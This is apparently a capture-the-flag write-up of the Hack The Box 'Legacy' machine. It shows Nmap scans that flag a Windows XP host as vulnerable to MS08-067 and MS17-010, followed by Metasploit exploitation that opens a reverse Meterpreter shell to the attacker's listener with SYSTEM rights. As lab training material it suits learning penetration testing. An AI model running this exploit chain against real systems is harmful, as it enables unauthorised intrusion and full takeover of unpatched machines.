# Hackthebox Legacy


Before we start I always reset the box, it is often that services have crashed or behaves in unintended ways after others have exploited them. And I do not want any spoilers that may have been left by others on the box.


## Recon

We perform our initial enumeration of the box using Nmap.

```
# Nmap 7.70 scan initiated Sun Oct 21 11:12:32 2018 as: nmap -v -sV -oA legacy_initial 10.10.10.4
Nmap scan report for 10.10.10.4
Host is up (0.038s latency).
Not shown: 997 filtered ports
PORT     STATE  SERVICE       VERSION
139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open   microsoft-ds  Microsoft Windows XP microsoft-ds
3389/tcp closed ms-wbt-server
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Oct 21 11:12:44 2018 -- 1 IP address (1 host up) scanned in 11.84 seconds
```

At he same time we start a more extensive scan scanning all tcp ports and services. This time this did not result in any additional findings.

We see that it is an old Windows XP box with SMB exposed. This gets me thinking of the good old ms08-067 exploit.

Let's do a vulnscan using Nmap to see if it is vulnerable

```
Nmap scan report for 10.10.10.4
Host is up (0.037s latency).

PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms08-067:
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary                                                                                                    
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|
|     Disclosure date: 2008-10-23
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
|_      https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143

NSE: Script Post-scanning.
Initiating NSE at 11:18
Completed NSE at 11:18, 0.00s elapsed
Initiating NSE at 11:18
Completed NSE at 11:18, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 16.62 seconds
           Raw packets sent: 6 (240B) | Rcvd: 3 (116B)
```

Bingo!

## Initial Compromise

Let's use Metasploit to see if we can get a quick win.

```
msf > search ms08-067

Matching Modules
================

   Name                                 Disclosure Date  Rank   Description
   ----                                 ---------------  ----   -----------
   exploit/windows/smb/ms08_067_netapi  2008-10-28       great  MS08-067 Microsoft Server Service Relative Path Stack Corruption
```

```
msf exploit(windows/smb/ms08_067_netapi) > exploit 

[*] Started reverse TCP handler on 10.10.14.3:4444 
[*] 10.10.10.4:445 - Automatically detecting the target...
[*] 10.10.10.4:445 - Fingerprint: Windows XP - Service Pack 3 - lang:Unknown
[*] 10.10.10.4:445 - We could not detect the language pack, defaulting to English
[*] 10.10.10.4:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] 10.10.10.4:445 - Attempting to trigger the vulnerability...
[*] Sending stage (179779 bytes) to 10.10.10.4
[*] Meterpreter session 1 opened (10.10.14.3:4444 -> 10.10.10.4:1031) at 2018-10-21 11:27:11 +0200

meterpreter > getuid 
Server username: NT AUTHORITY\SYSTEM
meterpreter > 
```

As the service runs as system we get a system shell.

This was a quick one.
